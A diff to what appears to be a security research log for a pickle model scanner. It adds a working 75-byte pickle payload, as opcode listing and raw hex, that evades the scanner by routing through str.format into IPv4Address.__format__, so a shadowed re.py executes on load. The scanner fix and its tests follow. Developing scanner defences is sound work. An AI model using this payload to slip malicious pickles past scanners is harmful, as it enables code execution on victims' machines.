@@ -13933,3 +13933,201 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3738 passed, 1022 skipped, 21 warnings in 52.04s`.
+
+## Turn 233 - Bypass via `str.format` method descriptor protocol dispatch
+
+Found a scanner-clean RCE-capable bypass in another format protocol dispatcher.
+Turn 226 modeled the builtin `format(obj, spec)` call, but the dotted builtin
+method descriptor `builtins.str.format` can also dispatch into
+`obj.__format__(spec)`. The payload constructs `ipaddress.IPv4Address`, then
+invokes `str.format("{:b}", address)`. At runtime this enters
+`IPv4Address.__format__("b")` / `_BaseAddress.__format__()`, which performs a
+function-body `import re`. A shadow `re.py` at the front of `sys.path` executes
+during `pickle.loads`.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL ipaddress IPv4Address
+SHORT_BINUNICODE "1.2.3.4"
+TUPLE1
+REDUCE              # construct IPv4Address("1.2.3.4")
+MEMOIZE
+POP
+STACK_GLOBAL builtins str.format
+MARK
+SHORT_BINUNICODE "{:b}"
+BINGET 0
+TUPLE
+REDUCE              # "{:b}".format(address) enters address.__format__("b")
+STOP
+```
+
+Raw payload:
+
+```text
+80048c096970616464726573738c0b4950763441646472657373938c07312e322e332e34855294308c086275696c74696e738c0a7374722e666f726d617493288c047b3a627d680074522e
+```
+
+Scanner proof:
+
+```text
+payload_len 75
+scan clean complete findings 0 errors ()
+import_refs (
+  {'module': 'ipaddress', 'name': 'IPv4Address',
+   'import_reference': 'ipaddress.IPv4Address', 'is_dangerous': False},
+  {'module': 'builtins', 'name': 'str.format',
+   'import_reference': 'builtins.str.format', 'is_dangerous': False},
+)
+callable_invocations (
+  {'module': 'ipaddress', 'name': 'IPv4Address',
+   'opcode_position': 37, 'positional_arg_count': 1},
+  {'module': 'builtins', 'name': 'str.format',
+   'opcode_position': 73, 'positional_arg_count': 2},
+)
+actual_dangerous ()
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime stdout
+result '00000001000000100000001100000100'
+marker_exists True
+marker_text re-owned
+
+runtime stderr
+```
+
+The child proof inserted a temporary module directory at the front of
+`sys.path`, removed `ipaddress` and `re` from `sys.modules`, and ran
+`pickle.loads(payload)`. The shadow `re.py` wrote the marker at import time and
+returned a minimal fake pattern object whose `fullmatch("b").groups()` matched
+what `ipaddress` expects for binary formatting.
+
+Why it bypasses:
+
+- Native policy does not mark `ipaddress.IPv4Address` or
+  `builtins.str.format` as dangerous.
+- Turn 226's protocol-dispatch metadata handles `builtins.format` but not the
+  importable dotted builtin method descriptor `builtins.str.format`.
+- The native metadata records only `builtins.str.format` with two positional
+  arguments; it never records that `ipaddress.IPv4Address.__format__` is
+  entered with a supplied format spec.
+- The Python call graph already catches `ipaddress.IPv4Address.__format__`
+  reaching `builtins.__import__` once native metadata names that method, but no
+  invocation metadata names it here.
+- The payload contains no `__format__` literal and does not import `re`.
+
+Likely source-level defense:
+
+- Extend the native format protocol-dispatch model to cover
+  `builtins.str.format`. When the first argument is a tracked format-string
+  literal and later arguments include tracked constructed objects, emit
+  `Class.__format__` invocations for the supplied replacement fields.
+- A conservative first fix can treat any `builtins.str.format` call with a
+  tracked constructed object argument after the format string as an invocation
+  of `Class.__format__` with one positional argument.
+- Keep the check stack-local and finite, alongside the existing
+  `builtins.format` protocol-dispatch handling.
+- Consider `str.format_map` separately; it dispatches through mapping lookup
+  and may combine with callback-bearing mappings.
+
+Performance note:
+
+- Payload size is 75 bytes.
+- Warm scan median over 100 runs was `0.000044s` with max `0.000055s`.
+- A fix can reuse the existing reducer argument extraction and only inspect
+  `builtins.str.format` calls.
+
+## Turn 234 - Defense for `str.format` protocol dispatch
+
+Implemented the source-level block for Turn 233 by extending the existing
+native format protocol-dispatch model. The scanner now treats
+`builtins.str.format(format_string, obj, ...)` as a finite dispatcher that can
+enter `obj.__format__(spec)` for tracked constructed objects after the format
+string argument.
+
+Fix details:
+
+- Split the native format-dispatch logic into small helpers for
+  `builtins.format` and `builtins.str.format`.
+- `builtins.format(obj, spec)` behavior remains unchanged: a tracked
+  constructed first argument emits `Class.__format__`.
+- `builtins.str.format(format_string, *args)` now requires a tracked
+  string-like first argument, then emits `Class.__format__` for each tracked
+  constructed positional argument after the format string.
+- The synthetic `Class.__format__` invocation uses one positional argument,
+  matching the format-spec argument passed by Python.
+- The Python call graph already resolves inherited `IPv4Address.__format__`
+  back to `_BaseAddress.__format__`, so the existing import-execution sink
+  catches the RCE path once native metadata names it.
+
+Regression coverage:
+
+- `test_call_graph_models_str_format_protocol_dispatch_invocations` covers the
+  arity-aware call-graph behavior for synthetic `IPv4Address.__format__`
+  metadata.
+- `test_scan_bytes_blocks_ipaddress_str_format_protocol_dispatch_import_rce`
+  scans the Turn 233 payload as malicious, verifies native
+  `IPv4Address.__format__` invocation metadata, and executes the payload in a
+  child interpreter with a shadow `re.py`.
+
+Post-fix proof:
+
+```text
+payload_len 75
+scan malicious complete findings 1
+callable_invocations (
+  {'module': 'ipaddress', 'name': 'IPv4Address',
+   'opcode_position': 37, 'positional_arg_count': 1},
+  {'module': 'builtins', 'name': 'str.format',
+   'opcode_position': 73, 'positional_arg_count': 2},
+  {'module': 'ipaddress', 'name': 'IPv4Address.__format__',
+   'opcode_position': 73, 'positional_arg_count': 1},
+)
+call_graph [{'module': 'ipaddress',
+  'name': 'IPv4Address.__format__',
+  'sink': 'builtins.__import__',
+  'call_path': ('ipaddress.IPv4Address.__format__',
+                'builtins.__import__')}]
+dangerous (CallGraphFinding(module='ipaddress',
+  name='IPv4Address.__format__', sink='builtins.__import__'),)
+runtime rc 0
+runtime stdout
+result '00000001000000100000001100000100'
+marker_exists True
+marker_text re-owned
+runtime stderr
+warm_median 0.000102
+warm_max 0.000209
+```
+
+Performance note:
+
+- The new check is stack-local and only inspects already-extracted
+  `builtins.str.format` reducer arguments.
+- Warm scan median for the fixed 75-byte payload was `0.000102s` over 100
+  runs.
+
+Validation:
+
+- Rust formatting: `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused `str.format` regression: `1 passed in 0.18s`.
+- Focused import/call-graph regression file: `25 passed in 0.99s`.
+- Focused call-graph suite: `63 passed in 2.56s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  0.60s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3740 passed, 1022 skipped, 21 warnings in 50.89s`.
